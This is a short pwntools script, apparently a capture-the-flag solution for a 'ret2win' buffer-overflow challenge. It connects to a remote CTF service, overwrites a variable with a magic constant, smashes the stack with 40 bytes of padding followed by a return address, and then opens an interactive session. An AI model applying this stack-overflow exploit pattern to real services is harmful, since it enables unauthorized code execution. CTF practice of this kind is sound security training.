from pwn import *

p = remote('ctf.ropcity.com', 31337)
#p = process('ret2win')
p.sendline(b'A' *20+ p64(0xbaddecafbeefcafe))
p.sendline(b'a' *40 + p64(0x00400607))

p.interactive()
